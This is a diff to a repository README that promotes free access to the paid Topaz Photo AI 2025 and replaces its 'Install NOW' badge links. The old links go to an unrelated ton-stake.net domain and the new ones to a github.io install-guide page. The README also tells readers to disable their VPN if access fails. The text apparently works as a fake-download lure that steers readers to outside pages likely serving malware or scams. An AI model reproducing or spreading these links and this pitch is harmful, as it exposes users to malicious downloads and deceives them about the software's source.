@@ -5,7 +5,9 @@
 
 **Description**: Elevate your photography with **Topaz Photo AI 2025**, offering free AI editing access for stunning results! This repository provides tutorials, resources, and tips to explore Topaz’s neural network features for upscaling and denoising. Download your free version and join our vibrant community in 2025!  
 
-[![Install Topaz Photo AI 2025](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
+<a href="https://topazaiphotoenhancingcommunity.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
 ---
 
@@ -28,7 +30,9 @@ Enhance your photos with these simple steps to set up Topaz Photo AI 2025! 🛠�
 5. **Access Problems?** 🌐  
    If access fails, disable your VPN or switch browsers (e.g., Chrome, Firefox).  
 
-[![Install Topaz Photo AI 2025](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
+<a href="https://topazaiphotoenhancingcommunity.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
 ---
 
